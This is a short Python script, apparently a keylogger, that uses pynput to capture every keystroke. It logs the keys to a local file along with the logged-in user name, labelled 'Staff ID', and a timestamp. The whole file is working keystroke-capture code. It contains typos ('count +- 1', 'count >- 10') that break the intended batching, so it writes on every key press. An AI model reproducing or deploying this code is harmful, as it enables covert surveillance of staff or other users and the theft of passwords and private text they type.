import os
import pynput 
import datetime
from pynput.keyboard import Key, Listener

count = 0
keys = []

with open("logs 2.txt", 'a') as file:
        file.write("\n")
        file.write("_________________________________________")
        file.write("\n")
        file.write("Staff ID: ")
        file.write(os.getlogin())
        file.write("\n")
        file.write(datetime.datetime.now().strftime("%d-%b-%Y (%H:%M:%S.%f)"))
        file.write("\n")
        file.write("")
          
def on_press(key):
    global keys, count

    keys.append(key)
    count +- 1
    print("{0} pressed".format(key))

    if count >- 10:
        count = 0
        write_file(keys)
        keys = []

        

def write_file(keys):
    
    pass                            
    with open("logs 2.txt","a")as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(" ")
                #f.write("\t")
            if k.find("enter") > 0:     
                f.write("\n")  
            if k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release =on_release) as listener:
    listener.join()
    
